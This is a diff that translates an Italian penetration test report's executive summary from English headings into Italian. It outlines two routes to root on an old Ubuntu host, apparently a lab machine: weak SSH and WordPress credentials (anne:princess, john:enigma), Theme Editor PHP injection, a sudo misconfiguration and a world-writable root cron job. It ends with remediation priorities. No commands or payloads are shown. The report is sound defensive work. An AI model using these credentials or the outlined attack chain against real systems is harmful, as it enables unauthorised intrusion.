 - Sistema operativo obsoleto (End of Life - Ubuntu 12.04)
 - Servizio FTP mal configurato con accesso anonimo
 - Information disclosure (lista utenti esposta)
 - Credenziali SSH estremamente deboli (anne:princess)
-- Privilege escalation banale tramite sudo misconfiguration
-- Vulnerabilità critiche non patched (Shellshock CVE-2014-6271)
+- Privilege escalation banale tramite configurazione sudo errata
+- Vulnerabilità critiche non patchate (Shellshock CVE-2014-6271)
 
-**Attack Path 2 - WordPress (Time to Root: 15-20 minuti):**
+**Percorso di Attacco 2 - WordPress (Tempo per Root: 15-20 minuti):**
 - WordPress 4.5 obsoleto esposto tramite robots.txt
 - Credenziali amministrative deboli (john:enigma)
-- Theme Editor abilitato permettendo PHP code injection
+- Theme Editor abilitato permettendo iniezione codice PHP
 - Remote Code Execution come www-data
-- World-writable cron script eseguito come root (777 permissions)
+- Script cron world-writable eseguito come root (permessi 777)
 - Privilege escalation immediata sfruttando il cron job
 
-### Critical Risk Factors
+### Fattori di Rischio Critici
 
-1. **Multiple Independent Attack Vectors:** Due path completamente separati aumentano esponenzialmente il rischio
-2. **Weak Credentials Everywhere:** Tutte le credenziali scoperte erano deboli e facilmente brute-forceable
-3. **End of Life System:** Nessun supporto di sicurezza, vulnerabilità note non patchabili
-4. **Misconfigurations:** Sudo, file permissions (777), editor accessibili
-5. **Lack of Defense in Depth:** Nessun layer di sicurezza aggiuntivo (WAF, IDS, rate limiting)
+1. **Vettori di Attacco Indipendenti Multipli:** Due percorsi completamente separati aumentano esponenzialmente il rischio
+2. **Credenziali Deboli Ovunque:** Tutte le credenziali scoperte erano deboli e facilmente attaccabili con brute force
+3. **Sistema End of Life:** Nessun supporto di sicurezza, vulnerabilità note non correggibili
+4. **Configurazioni Errate:** Sudo, permessi file (777), editor accessibili
+5. **Mancanza di Defense in Depth:** Nessun livello di sicurezza aggiuntivo (WAF, IDS, rate limiting)
 
-### Immediate Business Impact
+### Impatto Immediato sul Business
 
-- **Confidentiality:** COMPROMESSA - Accesso root = accesso a tutti i dati
-- **Integrity:** COMPROMESSA - Possibilità di modificare qualsiasi dato/configurazione
-- **Availability:** A RISCHIO - Possibilità di causare DoS completo
-- **Reputation:** A RISCHIO - Data breach potenziale, compliance violations
+- **Riservatezza:** COMPROMESSA - Accesso root = accesso a tutti i dati
+- **Integrità:** COMPROMESSA - Possibilità di modificare qualsiasi dato/configurazione
+- **Disponibilità:** A RISCHIO - Possibilità di causare DoS completo
+- **Reputazione:** A RISCHIO - Potenziale data breach, violazioni di conformità
 
-### Urgency Assessment
+### Valutazione dell'Urgenza
 
 **CRITICO - AZIONE IMMEDIATA RICHIESTA**
 
 Il sistema è attualmente in uno stato di **MASSIMO RISCHIO** e dovrebbe essere:
 
 1. **Immediatamente isolato** dalla rete di produzione
-2. **Sottoposto a hardening completo** seguendo le raccomandazioni Priority 1
+2. **Sottoposto a hardening completo** seguendo le raccomandazioni Priorità 1
 3. **Monitorato 24/7** per segni di compromissione
 4. **Pianificato per completa reinstallazione** con OS supportato
 
-### Recommendations Priority
+### Priorità delle Raccomandazioni
 
 1. ✅ **IMMEDIATE (0-48h):** Patch critiche, cambio password, correzione permessi, rimozione/protezione WordPress
-2. ⚠️ **SHORT-TERM (1-2 settimane):** Hardening completo, aggiornamenti, implementazione WAF, 2FA
-3. 📋 **LONG-TERM (1-3 mesi):** Migrazione OS, security monitoring, incident response, vulnerability management program
+2. ⚠️ **BREVE TERMINE (1-2 settimane):** Hardening completo, aggiornamenti, implementazione WAF, 2FA
+3. 📋 **LUNGO TERMINE (1-3 mesi):** Migrazione OS, monitoraggio sicurezza, incident response, programma vulnerability management
 
-### Final Note
+### Nota Finale
 
 Questo penetration test ha identificato **condizioni di sicurezza estremamente critiche**. In un ambiente reale, questo sistema sarebbe stato compromesso in pochi minuti da un attaccante con conoscenze anche basilari.
 
 **Si raccomanda con massima urgenza:**
-- Applicazione immediata delle remediation Priority 1
+- Applicazione immediata delle remediation Priorità 1
 - Considerare il sistema come già potenzialmente compromesso
-- Verificare log per evidenze di compromissione passata
-- Pianificare completa ricostruzione del sistema con best practices moderne
+- Verificare i log per evidenze di compromissione passata
+- Pianificare completa ricostruzione del sistema con best practice moderne
 
-**Data del Report:** January 27, 2026  
-**Versione:** 2.0 - FINAL  
-**Status:** COMPLETE - Entrambi i path di attacco documentati
+**Data del Report:** 27 Gennaio 2026  
+**Versione:** 2.0 - FINALE  
+**Stato:** COMPLETO - Entrambi i percorsi di attacco documentati
 
 ---
 
